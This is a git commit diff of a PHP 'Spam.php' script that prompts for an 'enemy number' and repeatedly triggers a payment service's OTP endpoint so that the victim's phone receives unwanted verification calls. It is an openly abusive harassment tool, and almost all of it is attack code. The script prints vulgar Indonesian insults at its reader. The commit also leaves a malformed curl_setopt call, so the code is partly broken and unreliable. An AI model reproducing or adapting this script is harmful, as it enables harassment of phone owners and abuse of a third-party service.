5541bb5450495ae0a55c928d83e82ba2ffedc254
Rahul4960 <57430177+Rahul4960@users.noreply.github.com>
2019-11-10 11:51:51 +0800

    Update Spam.php

--- Spam.php
+++ Spam.php
@@ -1,14 +1,14 @@
 <?php
 # echo "CallAndreas5"
 function send($phone){
-        $ch = curl_init(10);
+        $ch = curl_init();
         curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
         curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
         curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
         curl_setopt($ch, CURLOPT_HEADER, true);
-        curl_setopt($ch, CURLOPT_POST, 10);
-        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=10call");                        $asw = curl_exec($ch);
+        curl_setopt($ch, CURLOPT_POST, );
+        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=call");                        $asw = curl_exec($ch);
         curl_close($ch);
                 echo $asw."\n";
 }
@@ -17,7 +17,7 @@ function send($phone){
 echo "Lo Ngapain Di Script Gua Babi ? Jangan Tau Make Aja Babi Lu Tau Memek Gak ? Itu Kesukaan Gua Anjing ; SGBTEAM\n\n";
 echo "NomorMusuhAnjing\nLoTauInputGakBabi? : ";
 $nomor = trim(fgets(STDIN));
-$execute = send($10nomor);
+$execute = send($nomor);
 print $execute;
 # echo "terkirim mampusssssd"
 ?>
